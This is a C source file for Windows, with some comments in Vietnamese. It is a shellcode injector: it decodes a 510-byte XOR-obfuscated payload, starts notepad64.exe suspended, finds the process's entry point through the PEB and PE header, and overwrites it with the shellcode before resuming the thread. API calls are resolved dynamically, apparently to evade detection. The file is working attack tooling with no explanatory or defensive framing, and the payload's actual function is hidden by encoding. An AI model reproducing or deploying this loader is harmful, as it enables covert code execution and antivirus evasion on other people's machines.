#include <windows.h>
#include <stdio.h>

// Shellcode 
unsigned char shellcode[] = {0xb1,0x05,0xce,0xa9,0xbd,0xa5,0x81,0x4d,0x4d,0x4d,0x0c,0x1c,0x0c,0x1d,0x1f,0x05,0x7c,0x9f,0x1c,0x28,0x05,0xc6,0x1f,0x2d,0x1b,0x05,0xc6,0x1f,0x55,0x05,0xc6,0x1f,0x6d,0x05,0x42,0xfa,0x07,0x07,0x00,0x7c,0x84,0x05,0xc6,0x3f,0x1d,0x05,0x7c,0x8d,0xe1,0x71,0x2c,0x31,0x4f,0x61,0x6d,0x0c,0x8c,0x84,0x40,0x0c,0x4c,0x8c,0xaf,0xa0,0x1f,0x05,0xc6,0x1f,0x6d,0xc6,0x0f,0x71,0x05,0x4c,0x9d,0x2b,0xcc,0x35,0x55,0x46,0x4f,0x0c,0x1c,0x42,0xc8,0x3f,0x4d,0x4d,0x4d,0xc6,0xcd,0xc5,0x4d,0x4d,0x4d,0x05,0xc8,0x8d,0x39,0x2a,0x05,0x4c,0x9d,0x1d,0xc6,0x05,0x55,0x09,0xc6,0x0d,0x6d,0x04,0x4c,0x9d,0xae,0x1b,0x05,0xb2,0x84,0x00,0x7c,0x84,0x0c,0xc6,0x79,0xc5,0x05,0x4c,0x9b,0x05,0x7c,0x8d,0x0c,0x8c,0x84,0x40,0xe1,0x0c,0x4c,0x8c,0x75,0xad,0x38,0xbc,0x01,0x4e,0x01,0x69,0x45,0x08,0x74,0x9c,0x38,0x95,0x15,0x09,0xc6,0x0d,0x69,0x04,0x4c,0x9d,0x2b,0x0c,0xc6,0x41,0x05,0x09,0xc6,0x0d,0x51,0x04,0x4c,0x9d,0x0c,0xc6,0x49,0xc5,0x05,0x4c,0x9d,0x0c,0x15,0x0c,0x15,0x13,0x14,0x17,0x0c,0x15,0x0c,0x14,0x0c,0x17,0x05,0xce,0xa1,0x6d,0x0c,0x1f,0xb2,0xad,0x15,0x0c,0x14,0x17,0x05,0xc6,0x5f,0xa4,0x06,0xb2,0xb2,0xb2,0x10,0x04,0xf3,0x3a,0x3e,0x7f,0x12,0x7e,0x7f,0x4d,0x4d,0x0c,0x1b,0x04,0xc4,0xab,0x05,0xcc,0xa1,0xed,0x4c,0x4d,0x4d,0x04,0xc4,0xa8,0x04,0xf1,0x4f,0x4d,0x6e,0x65,0x8d,0xe5,0x4f,0x2a,0x0c,0x19,0x04,0xc4,0xa9,0x01,0xc4,0xbc,0x0c,0xf7,0x01,0x3a,0x6b,0x4a,0xb2,0x98,0x01,0xc4,0xa7,0x25,0x4c,0x4c,0x4d,0x4d,0x14,0x0c,0xf7,0x64,0xcd,0x26,0x4d,0xb2,0x98,0x27,0x47,0x0c,0x13,0x1d,0x1d,0x00,0x7c,0x84,0x00,0x7c,0x8d,0x05,0xb2,0x8d,0x05,0xc4,0x8f,0x05,0xb2,0x8d,0x05,0xc4,0x8c,0x0c,0xf7,0xa7,0x42,0x92,0xad,0xb2,0x98,0x05,0xc4,0x8a,0x27,0x5d,0x0c,0x15,0x01,0xc4,0xaf,0x05,0xc4,0xb4,0x0c,0xf7,0xd4,0xe8,0x39,0x2c,0xb2,0x98,0xc8,0x8d,0x39,0x47,0x04,0xb2,0x83,0x38,0xa8,0xa5,0xde,0x4d,0x4d,0x4d,0x05,0xce,0xa1,0x5d,0x05,0xc4,0xaf,0x00,0x7c,0x84,0x27,0x49,0x0c,0x15,0x05,0xc4,0xb4,0x0c,0xf7,0x4f,0x94,0x85,0x12,0xb2,0x98,0xce,0xb5,0x4d,0x33,0x18,0x05,0xce,0x89,0x6d,0x13,0xc4,0xbb,0x27,0x0d,0x0c,0x14,0x25,0x4d,0x5d,0x4d,0x4d,0x0c,0x15,0x05,0xc4,0xbf,0x05,0x7c,0x84,0x0c,0xf7,0x15,0xe9,0x1e,0xa8,0xb2,0x98,0x05,0xc4,0x8e,0x04,0xc4,0x8a,0x00,0x7c,0x84,0x04,0xc4,0xbd,0x05,0xc4,0x97,0x05,0xc4,0xb4,0x0c,0xf7,0x4f,0x94,0x85,0x12,0xb2,0x98,0xce,0xb5,0x4d,0x30,0x65,0x15,0x0c,0x1a,0x14,0x25,0x4d,0x0d,0x4d,0x4d,0x0c,0x15,0x27,0x4d,0x17,0x0c,0xf7,0x46,0x62,0x42,0x7d,0xb2,0x98,0x1a,0x14,0x0c,0xf7,0x38,0x23,0x00,0x2c,0xb2,0x98,0x04,0xb2,0x83,0xa4,0x71,0xb2,0xb2,0xb2,0x05,0x4c,0x8e,0x05,0x64,0x8b,0x05,0xc8,0xbb,0x38,0xf9,0x0c,0xb2,0xaa,0x15,0x27,0x4d,0x14,0x04,0x8a,0x8f,0xbd,0xf8,0xef,0x1b,0xb2,0x98};
unsigned int shellcode_len = 510;

typedef NTSTATUS(WINAPI* _ZwQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef BOOL(WINAPI* PFN_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* PFN_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* PFN_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(WINAPI* PFN_ResumeThread)(HANDLE);
typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);

int main() {
    // Dynamic load Kernel32 and Ntdll
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    // Resolve all needed API
    PFN_CreateProcessA pCreateProcessA = (PFN_CreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
    PFN_ReadProcessMemory pReadProcessMemory = (PFN_ReadProcessMemory)GetProcAddress(hKernel32, "ReadProcessMemory");
    PFN_WriteProcessMemory pWriteProcessMemory = (PFN_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    PFN_VirtualProtectEx pVirtualProtectEx = (PFN_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
    PFN_ResumeThread pResumeThread = (PFN_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
    PFN_CloseHandle pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    _ZwQueryInformationProcess ZwQueryInformationProcess = (_ZwQueryInformationProcess)GetProcAddress(hNtdll, "ZwQueryInformationProcess");

    // Check API resolving
    if (!pCreateProcessA || !pReadProcessMemory || !pWriteProcessMemory ||
        !pVirtualProtectEx || !pResumeThread || !pCloseHandle || !ZwQueryInformationProcess) {
        printf("Failed to resolve API(s).\n");
        return 1;
    }

    // create suspended
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = pCreateProcessA(
        "notepad64.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!ok) {
        printf("CreateProcess failed: %d\n", GetLastError());
        return 1;
    }
    HANDLE hProcess = pi.hProcess;

    // Lấy địa chỉ PEB
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG retLen = 0;
    ZwQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
    printf("[1] PEB is at: 0x%p\n", pbi.PebBaseAddress);

    // Đọc ImageBaseAddress từ PEB + 0x10
    PVOID imageBase = 0;
    SIZE_T bytesRead = 0;
    pReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(PVOID), &bytesRead);
    printf("[2] Image Base Address is: 0x%p\n", imageBase);

    // Đọc header PE để lấy EntryPoint RVA
    BYTE header[0x200] = { 0 };
    pReadProcessMemory(hProcess, imageBase, header, sizeof(header), &bytesRead);

    DWORD e_lfanew = *(DWORD*)(header + 0x3c);
    DWORD entryPointRVA = *(DWORD*)(header + e_lfanew + 0x28);
    PVOID entryPointVA = (PBYTE)imageBase + entryPointRVA;
    printf("[3] Entry Point is: 0x%p\n", entryPointVA);

    // Giải mã shellcode 
    unsigned char key = 77; 
    for (unsigned int i = 0; i < shellcode_len; ++i) {
        shellcode[i] ^= key;
    }

    // Ghi shellcode vào EntryPoint
    DWORD oldProtect = 0;
    pVirtualProtectEx(hProcess, entryPointVA, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect);
    SIZE_T written = 0;
    pWriteProcessMemory(hProcess, entryPointVA, shellcode, shellcode_len, &written);

    pResumeThread(pi.hThread);
    printf("[+] Shellcode injected and process resumed.\n");

    // Đóng handle tiến trình
    pCloseHandle(pi.hThread);
    pCloseHandle(pi.hProcess);

    return 0;
}
